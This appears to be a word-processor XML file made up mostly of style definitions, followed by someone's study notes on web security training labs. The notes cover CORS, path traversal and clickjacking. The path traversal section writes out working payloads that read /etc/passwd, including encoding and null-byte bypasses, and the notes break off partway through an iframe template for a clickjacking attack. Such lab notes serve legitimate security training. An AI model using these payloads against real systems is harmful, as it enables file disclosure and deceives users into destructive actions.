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Courier, sans-serif"/>
    <style:font-face style:name="Courier" svg:font-family="Courier,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margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="0019680e" officeooo:paragraph-rsid="0019680e"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="0019680e" officeooo:paragraph-rsid="0019680e"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="0019680e" officeooo:paragraph-rsid="0019680e"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="001e2ff4" officeooo:paragraph-rsid="001e2ff4"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="001e2ff4" officeooo:paragraph-rsid="001e2ff4"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0019680e"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.0835in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:orphans="2" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Arial" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Arial" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0019680e" officeooo:paragraph-rsid="0019680e"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Arial" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001e2ff4" officeooo:paragraph-rsid="001e2ff4"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.0835in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:widows="2" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="001e2ff4"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00201369" officeooo:paragraph-rsid="00201369" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00201369" officeooo:paragraph-rsid="00201369" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00212e79" officeooo:paragraph-rsid="00212e79" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00212e79" officeooo:paragraph-rsid="00212e79" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="0022c8d7" officeooo:paragraph-rsid="0022c8d7" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="0022c8d7" officeooo:paragraph-rsid="0022c8d7" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="00201369"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="00201369"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="00212e79"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="0022c8d7"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="00201369" officeooo:paragraph-rsid="00201369"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00236b0a"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="00280e1e" officeooo:paragraph-rsid="00280e1e"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="00280e1e" officeooo:paragraph-rsid="00280e1e"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="00280e1e"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="0029cd74" officeooo:paragraph-rsid="0029cd74"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties officeooo:rsid="002dffbe" officeooo:paragraph-rsid="002dffbe"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.0835in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.0835in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.3126in" fo:margin-bottom="0.0972in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.0835in" fo:margin-bottom="0.0835in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0.3126in" fo:margin-bottom="0.0972in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.2917in" fo:orphans="90" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" style:line-height-at-least="0.3126in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>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5">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>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8">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9"/>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10"/>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11"/>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12"/>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="0029cd74" officeooo:paragraph-rsid="0029cd74"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="0029cd74"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13"/>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="002bc766" officeooo:paragraph-rsid="002bc766"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="002bc766"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14"/>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="002dffbe" officeooo:paragraph-rsid="002dffbe"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="002dffbe" officeooo:paragraph-rsid="002dffbe"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0019680e"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="Arial" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Arial" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Courier" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#ebf0f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Courier" fo:font-size="13.5pt" fo:font-weight="normal" fo:background-color="#ebf0f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-size="13.5pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-size="13.5pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00201369" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="00212e79" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-size="13.5pt" officeooo:rsid="0022c8d7" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="001e2ff4"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="00236b0a"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="00280e1e"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="0029cd74"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties officeooo:rsid="002bc76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ab for CORS</text:p>
      <text:p text:style-name="Preformatted_20_Text">Lab#1 - CORD vulnerability with basic origin reflection</text:p>
      <text:p text:style-name="Preformatted_20_Text">Target Goal - Exploit the CORS misconfiguration to retrieve the administrator's API key</text:p>
      <text:p text:style-name="Preformatted_20_Text">Creds: Wiener:peter</text:p>
      <text:p text:style-name="Preformatted_20_Text">Analysis:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Adding Origin: header in the request</text:p>
      <text:p text:style-name="Preformatted_20_Text">Testing for CORS misconfigurations:</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.Change the origin to an arbitrary value / True</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #1 File Path traversal </text:p>
      <text:p text:style-name="Preformatted_20_Text">A path traversal vulnerability in display of product</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>Modify the filename parameter, giving it the value: <text:s text:c="2"/>../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #2 File path traversal, traversal sequences blocked with absolute path bypass</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a path traversal vulnerability in the display of product images.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, retrieve the contents of the /etc/passwd file. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Modify the filename parameter, giving it the value /etc/passwd.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #3 File path traversal, traversal sequences stripped non-recursively</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a path traversal vulnerability in the display of product images.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application strips path traversal sequences from the user-supplied filename before using it.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, retrieve the contents of the /etc/passwd file. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the filename parameter, giving it the value:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>....//....//....//etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #4 File path traversal, traversal sequences stripped with superfluous URL-decode</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a path traversal vulnerability in the display of product images.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, retrieve the contents of the /etc/passwd file. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solution:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/><text:tab/>Encode ../../../ double time by url encoding</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the filename parameter, giving it the value:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>..%252f..%252f..%252fetc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Lab #5 File path traversal, validation of start of path</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a path traversal vulnerability in the display of product images.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, retrieve the contents of the /etc/passwd file. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the filename parameter, giving it the value:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>/var/www/images/../../../etc/passwd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #6 File path traversal, validation of file extension with null byte bypass</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a path traversal vulnerability in the display of product images.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application validates that the supplied filename ends with the expected file extension.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, retrieve the contents of the /etc/passwd file. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify a request that fetches a product image.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the filename parameter, giving it the value:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>../../../etc/passwd%00.png</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Observe that the response contains the contents of the /etc/passwd file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab #1 Basic clickjacking with csrf protection token</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">You can log in to your own account using the following credentials: wiener:peter</text:p>
      <text:p text:style-name="Preformatted_20_Text">Note</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The victim will be using Chrome so test your exploit on that browser.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Log in to your account on the target website.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Go to the exploit server and paste the following HTML template into the Body section:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">&lt;style&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>iframe {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>position:relative;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>width:$width_value;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>height: $height_value;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>opacity: $opacity;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>z-index: 2;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>div {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>position:absolute;</text:p>
